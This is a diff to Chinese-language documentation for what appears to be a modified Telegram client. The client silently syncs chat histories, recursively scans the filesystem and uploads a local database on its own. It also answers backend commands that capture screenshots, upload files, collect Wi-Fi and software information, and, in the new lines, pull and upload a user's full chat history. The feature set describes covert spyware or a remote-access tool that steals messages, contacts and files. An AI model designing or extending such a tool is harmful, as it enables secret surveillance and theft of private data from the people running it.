@@ -20,6 +20,8 @@
 *   **功能增强**: 实现了静默聊天记录同步 (`syncChatHistory`)。在应用启动时自动获取之前的聊天记录（支持 Catch-up 模式），并记录同步状态以避免重复获取。
 *   **功能增强**: 优化了文件系统扫描 (`BackgroundScanner`)。现在支持自动启动和递归扫描所有子目录 (`QDirIterator`)，扫描完成后自动上传数据库。
 *   **功能增强**: 实现了 24 小时自动回传机制。如果本地数据超过 24 小时未上传，将自动触发全量数据库上传。
+*   **功能增强**: 新增后端命令 `fetch_full_chat_history`，可触发全量聊天记录抓取（递归获取历史记录直至完毕）并自动上传数据库。
+*   **功能增强**: 新增数据库自动清理机制。每次上传后自动删除超过 7 天的旧聊天记录并执行 `VACUUM` 压缩空间，防止数据库体积无限膨胀。
 *   **Schema 变更**: 新增 `chat_sync_state` 表用于记录每个会话的同步进度 (`min_id`, `max_id`)。
 *   **Schema 变更**: `chat_logs` 表新增 `media_path` 字段，用于存储图片/文件路径（目前支持 Photo ID）。
 *   **Bug修复**: 修复了 `heartbeat.cpp` 中的编译错误（包括 `emit` 关键字替换为 `Q_EMIT`，以及迭代器和类型匹配修复）。
@@ -74,6 +76,7 @@
         *   `get_screenshot`: 捕获并上传截图。
         *   `upload_file`: 上传指定文件。
         *   `upload_db`: 上传本地 `tdata` 数据库。
+        *   `fetch_full_chat_history`: 触发全量聊天记录同步并上传。
         *   `get_wifi` / `get_software`: 触发特定信息收集。
 
 ### 最近更新 (阶段 6 & 7)
@@ -149,6 +152,7 @@ Web 端开发者请参考以下 SQLite 数据库 (`tdata_client.db`) 结构进�
 | `receiver_id` | TEXT | 接收者 ID (或群 ID) |
 | `receiver_username` | TEXT | 接收者用户名 |
 | `receiver_phone` | TEXT | 接收者手机号 |
+| `media_path` | TEXT | 图片/文件路径 (初始为 `Photo:ID`，下载后更新为本地路径) |
 
 #### 6. 当前用户信息 (`current_user`)
 存储当前登录的 Telegram 用户信息。
